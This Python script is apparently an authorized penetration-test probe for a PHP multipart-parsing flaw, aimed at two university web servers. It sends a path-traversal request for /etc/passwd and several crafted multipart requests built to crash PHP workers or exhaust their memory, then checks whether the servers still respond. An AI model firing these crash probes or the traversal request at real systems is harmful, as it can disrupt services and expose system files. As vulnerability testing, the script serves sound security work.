#!/usr/bin/env python3
"""
PHP2Shell Vulnerability Probe — CVE-2026-109618 / CVE-2026-109619
===================================================================
Pentest autorizado UNS - orcl.uns.edu.pe

METODO: Detection-only probe (NO ejecuta comandos).
Detecta si el servidor es vulnerable midiendo diferencias de comportamiento
al enviar requests multipart/form-data crafteados que intentan
triggear la condicion OOM/longjmp del PHP core.

Indicadores de vulnerabilidad (sin explotar):
  - Diferencias de tiempo de respuesta anormales
  - Diferencias en codigos HTTP inesperados (500, 502, 503)
  - Crashes del worker (conexion reset)
  - Diferencias en Content-Length en respuestas identicas
"""

import os, sys
os.environ["PYTHONIOENCODING"] = "utf-8"
if sys.stdout.encoding != 'utf-8':
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')

import requests
import urllib3
import time
import struct
import hashlib
import statistics
import re
from io import BytesIO

urllib3.disable_warnings()

TARGET = "https://orcl.uns.edu.pe"
# Tambien probar en sigea que tiene PHP 7.1.33 confirmado
TARGET2 = "https://sigea.uns.edu.pe"

RESULTS = {}

def log(msg, level="INFO"):
    icons = {"INFO": "[*]", "FOUND": "[+]", "VULN": "[!!!]", "FAIL": "[-]", "WARN": "[?]"}
    print(f"  {icons.get(level, '[*]')} {msg}")


# ═══════════════════════════════════════════════════════════
# FASE 1: Deteccion de version PHP via tecnicas indirectas
# ═══════════════════════════════════════════════════════════
def detect_php_version(target):
    log(f"Detectando version PHP en {target}...")

    # 1. Header directo
    r = requests.get(target, verify=False, timeout=10)
    php_ver = r.headers.get("X-Powered-By", None)
    if php_ver and "PHP" in php_ver:
        log(f"X-Powered-By: {php_ver}", "FOUND")
        return php_ver

    # 2. Buscar en body de errores PHP
    # Enviar request malformada para provocar error PHP
    test_paths = [
        "/index.php/../../etc/passwd",
        "/index.php?test=<script>",
        "/index.php?a[][]",
    ]
    for path in test_paths:
        try:
            r2 = requests.get(f"{target}{path}", verify=False, timeout=8)
            ver_match = re.search(r"PHP[/ ](\d+\.\d+\.\d+)", r2.text + str(r2.headers))
            if ver_match:
                ver = ver_match.group(1)
                log(f"Version detectada via error: PHP {ver}", "FOUND")
                return ver
        except:
            pass

    # 3. Timing fingerprint - PHP versiones distintas tienen distintos tiempos
    # en procesamiento de multipart headers malformados
    log("Version PHP oculta - continuando con probe behavioral...", "WARN")
    return "desconocida"


# ═══════════════════════════════════════════════════════════
# FASE 2: Baseline de comportamiento normal
# ═══════════════════════════════════════════════════════════
def get_baseline(target, n=5):
    log(f"Estableciendo baseline ({n} requests normales)...")
    times = []
    sizes = []
    codes = []

    for i in range(n):
        try:
            start = time.perf_counter()
            r = requests.post(
                target,
                data={"test": "baseline_normal_request"},
                verify=False,
                timeout=15
            )
            elapsed = (time.perf_counter() - start) * 1000
            times.append(elapsed)
            sizes.append(len(r.content))
            codes.append(r.status_code)
            time.sleep(0.2)
        except Exception as e:
            log(f"Error en baseline: {e}", "WARN")

    if times:
        avg_time = statistics.mean(times)
        std_time = statistics.stdev(times) if len(times) > 1 else 0
        avg_size = statistics.mean(sizes)
        log(f"Baseline: avg={avg_time:.0f}ms, std={std_time:.0f}ms, size={avg_size:.0f}b, codes={set(codes)}")
        return avg_time, std_time, avg_size
    return 500, 100, 5000


# ═══════════════════════════════════════════════════════════
# FASE 3: PHP2Shell Detection Probes
# ═══════════════════════════════════════════════════════════
def probe_php2shell(target, baseline_time, baseline_std, baseline_size):
    log(f"\nEjecutando PHP2Shell detection probes en {target}...")
    log("(CVE-2026-109618/109619 - sin ejecutar payload, solo deteccion)\n")

    findings = []

    # --- PROBE 1: multipart con boundary malformado (OOM trigger test) ---
    log("Probe 1: multipart boundary malformado...")
    try:
        # Boundary extremadamente largo (intenta triggear OOM en parser)
        long_boundary = "A" * 4096
        body = (
            f"--{long_boundary}\r\n"
            f"Content-Disposition: form-data; name=\"test\"\r\n\r\n"
            f"value\r\n"
            f"--{long_boundary}--\r\n"
        ).encode()

        start = time.perf_counter()
        r = requests.post(
            target,
            data=body,
            headers={
                "Content-Type": f"multipart/form-data; boundary={long_boundary}",
                "Content-Length": str(len(body)),
                "User-Agent": "Mozilla/5.0"
            },
            verify=False,
            timeout=20
        )
        elapsed = (time.perf_counter() - start) * 1000

        delta = elapsed - baseline_time
        log(f"  HTTP {r.status_code} | {elapsed:.0f}ms | delta={delta:+.0f}ms | size={len(r.content)}b")

        if r.status_code in [500, 502, 503, 0]:
            findings.append(("PROBE1", f"HTTP {r.status_code} - posible crash del worker", "VULN"))
        elif delta > baseline_time * 2:
            findings.append(("PROBE1", f"Tiempo {elapsed:.0f}ms vs baseline {baseline_time:.0f}ms - anomalia", "WARN"))
        else:
            log("  -> Comportamiento normal", "FAIL")

    except requests.exceptions.ConnectionError as e:
        log(f"  -> CONNECTION RESET - posible crash del worker PHP!", "VULN")
        findings.append(("PROBE1", f"ConnectionError: {str(e)[:100]}", "VULN"))
    except Exception as e:
        log(f"  -> Error: {e}", "WARN")


    # --- PROBE 2: Session upload progress + multipart craft ---
    log("Probe 2: session.upload_progress vector...")
    try:
        # Este vector abusa de session.upload_progress si esta habilitado
        # con un campo PHP_SESSION_UPLOAD_PROGRESS y un boundary crafteado
        boundary = "----WebKitFormBoundary" + "x" * 16
        session_key = "PHP_SESSION_UPLOAD_PROGRESS"

        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{session_key}"\r\n\r\n'
            f"probe_cve_2026_109618_detection\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="test.txt"\r\n'
            f"Content-Type: text/plain\r\n\r\n"
            + "X" * 1024 + "\r\n"
            f"--{boundary}--\r\n"
        ).encode()

        start = time.perf_counter()
        r = requests.post(
            target,
            data=body,
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Content-Length": str(len(body)),
                "Cookie": "PHPSESSID=php2shell_detection_probe_" + hashlib.md5(b"probe").hexdigest()[:8],
                "User-Agent": "Mozilla/5.0"
            },
            verify=False,
            timeout=20
        )
        elapsed = (time.perf_counter() - start) * 1000

        log(f"  HTTP {r.status_code} | {elapsed:.0f}ms | size={len(r.content)}b")

        if r.status_code in [500, 502, 503]:
            findings.append(("PROBE2", f"HTTP {r.status_code} con upload_progress vector", "VULN"))
        else:
            log("  -> Comportamiento normal", "FAIL")

    except requests.exceptions.ConnectionError:
        log(f"  -> CONNECTION RESET - worker PHP crasheo!", "VULN")
        findings.append(("PROBE2", "ConnectionError con upload_progress vector", "VULN"))
    except Exception as e:
        log(f"  -> Error: {e}", "WARN")


    # --- PROBE 3: OOM trigger via campos masivos ---
    log("Probe 3: OOM trigger via parametros masivos...")
    try:
        # Enviar muchos campos multipart para intentar OOM
        boundary = "ProbeOOM" + "B" * 32
        parts = []
        # 500 campos de 1KB cada uno = ~500KB total
        for i in range(500):
            parts.append(
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="field_{i}"\r\n\r\n'
                f"{'V' * 1000}\r\n"
            )
        body = "".join(parts) + f"--{boundary}--\r\n"
        body = body.encode()

        log(f"  Enviando {len(body)//1024}KB en multipart...")
        start = time.perf_counter()
        r = requests.post(
            target,
            data=body,
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Content-Length": str(len(body)),
                "User-Agent": "Mozilla/5.0"
            },
            verify=False,
            timeout=30
        )
        elapsed = (time.perf_counter() - start) * 1000
        log(f"  HTTP {r.status_code} | {elapsed:.0f}ms | size={len(r.content)}b")

        if r.status_code in [500, 502, 503, 413]:
            if r.status_code == 413:
                log("  -> HTTP 413 Request Too Large (limite configurado)", "WARN")
                findings.append(("PROBE3", "HTTP 413 - hay limite de upload (mitiga parcialmente)", "WARN"))
            else:
                findings.append(("PROBE3", f"HTTP {r.status_code} con OOM trigger", "VULN"))
        else:
            log("  -> Comportamiento normal (proceso sin error)", "FAIL")

    except requests.exceptions.ConnectionError:
        log(f"  -> CONNECTION RESET!", "VULN")
        findings.append(("PROBE3", "ConnectionError con OOM masivo", "VULN"))
    except requests.exceptions.ReadTimeout:
        log("  -> TIMEOUT - servidor tardando mas de lo normal", "WARN")
        findings.append(("PROBE3", "Timeout en OOM probe - posible comportamiento anomalo", "WARN"))
    except Exception as e:
        log(f"  -> Error: {e}", "WARN")


    # --- PROBE 4: Content-Length mismatch (dangling pointer trigger) ---
    log("Probe 4: Content-Length mismatch...")
    try:
        boundary = "MismatchBoundary123"
        real_body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="test"\r\n\r\n'
            f"mismatch_probe\r\n"
            f"--{boundary}--\r\n"
        ).encode()

        # Declarar Content-Length MAYOR al body real (dangling read)
        fake_length = len(real_body) + 10000

        start = time.perf_counter()
        r = requests.post(
            target,
            data=real_body,
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Content-Length": str(fake_length),  # MISMATCH intencional
                "User-Agent": "Mozilla/5.0"
            },
            verify=False,
            timeout=20
        )
        elapsed = (time.perf_counter() - start) * 1000
        log(f"  HTTP {r.status_code} | {elapsed:.0f}ms | size={len(r.content)}b")

        # Un servidor bien configurado deberia dar 400 o timeout
        # PHP vulnerable puede crashear o dar respuesta anomala
        if r.status_code in [500, 502, 0]:
            findings.append(("PROBE4", f"HTTP {r.status_code} con Content-Length mismatch", "VULN"))
        elif r.status_code == 200:
            delta_size = abs(len(r.content) - baseline_size)
            if delta_size > baseline_size * 0.5:
                findings.append(("PROBE4", f"Respuesta anomala con CL mismatch: size={len(r.content)}", "WARN"))
            else:
                log("  -> Servidor maneja mismatch normalmente", "FAIL")
        else:
            log(f"  -> HTTP {r.status_code} (comportamiento esperado)", "FAIL")

    except requests.exceptions.ConnectionError:
        log(f"  -> CONNECTION RESET con Content-Length mismatch!", "VULN")
        findings.append(("PROBE4", "ConnectionError con CL mismatch", "VULN"))
    except requests.exceptions.ReadTimeout:
        log("  -> TIMEOUT esperando cuerpo (servidor colgado leyendo)", "WARN")
        findings.append(("PROBE4", "Timeout con Content-Length mismatch", "WARN"))
    except Exception as e:
        log(f"  -> Error: {e}", "WARN")


    # --- PROBE 5: Verificar si servidor se recupera (worker restart) ---
    log("Probe 5: Verificacion post-probe (servidor sigue vivo)...")
    try:
        time.sleep(1)
        r = requests.get(target, verify=False, timeout=10)
        if r.status_code == 200 and "phpMyAdmin" in r.text:
            log("  -> Servidor responde normalmente post-probe", "FOUND")
        else:
            log(f"  -> HTTP {r.status_code} post-probe - posible inestabilidad", "WARN")
            findings.append(("PROBE5", f"Servidor inestable post-probe: HTTP {r.status_code}", "WARN"))
    except Exception as e:
        log(f"  -> Servidor NO responde post-probe: {e}", "VULN")
        findings.append(("PROBE5", f"Servidor caido post-probe: {e}", "VULN"))

    return findings


# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════
def main():
    print("=" * 65)
    print("  PHP2Shell Detection Probe")
    print("  CVE-2026-109618 / CVE-2026-109619")
    print(f"  Target principal: {TARGET}")
    print(f"  Target secundario: {TARGET2}")
    print("=" * 65)

    all_findings = []

    # Probar en ambos targets
    for target in [TARGET, TARGET2]:
        print(f"\n{'='*65}")
        print(f"  TARGET: {target}")
        print(f"{'='*65}")

        # Detectar PHP
        php_ver = detect_php_version(target)

        # Baseline
        baseline_time, baseline_std, baseline_size = get_baseline(target)

        # Probes
        findings = probe_php2shell(target, baseline_time, baseline_std, baseline_size)
        all_findings.extend([(target, p, l, m) for p, m, l in findings])

        # Resultado por target
        print(f"\n  --- Resultado para {target} ---")
        vulns = [f for f in findings if f[2] == "VULN"]
        warns = [f for f in findings if f[2] == "WARN"]

        if vulns:
            log(f"VULNERABILIDADES DETECTADAS: {len(vulns)}", "VULN")
            for probe, msg, _ in vulns:
                log(f"  [{probe}] {msg}", "VULN")
        elif warns:
            log(f"COMPORTAMIENTO ANOMALO: {len(warns)} advertencias", "WARN")
            for probe, msg, _ in warns:
                log(f"  [{probe}] {msg}", "WARN")
        else:
            log("No se detectaron indicadores de vulnerabilidad PHP2Shell", "FAIL")
            log("(Puede ser: PHP parcheado, WAF filtrando, o config memory_limit alta)", "INFO")

    # Resumen final
    print(f"\n{'='*65}")
    print("  RESUMEN FINAL PHP2Shell Probe")
    print(f"{'='*65}")

    total_vulns = [f for f in all_findings if f[2] == "VULN"]
    total_warns = [f for f in all_findings if f[2] == "WARN"]

    if total_vulns:
        log(f"INDICADORES POSITIVOS DE CVE-2026-109618: {len(total_vulns)}", "VULN")
        log("Recomendacion: Actualizar PHP URGENTEMENTE", "VULN")
    elif total_warns:
        log(f"Comportamiento anomalo detectado: {len(total_warns)} advertencias", "WARN")
        log("Recomendacion: Investigar en caja blanca para confirmar", "WARN")
    else:
        log("Sin indicadores detectables de PHP2Shell en caja negra", "FAIL")
        log("NOTA: La ausencia de indicadores NO descarta la vulnerabilidad", "INFO")
        log("PHP version desconocida - si es PHP 7.x, sigue siendo vulnerable", "INFO")
        log("Confirmar version PHP via acceso SSH/consola para conclusion definitiva", "INFO")

    # Guardar
    results_file = r"c:\Users\Leguion T\Desktop\plan te pent\findings\php2shell_probe_results.txt"
    with open(results_file, "w", encoding="utf-8") as f:
        f.write("PHP2Shell Probe Results\n")
        f.write(f"CVE-2026-109618 / CVE-2026-109619\n")
        f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for target, probe, level, msg in all_findings:
            f.write(f"[{level}] [{probe}] {target}: {msg}\n")
    log(f"\nResultados guardados: {results_file}")


if __name__ == "__main__":
    main()
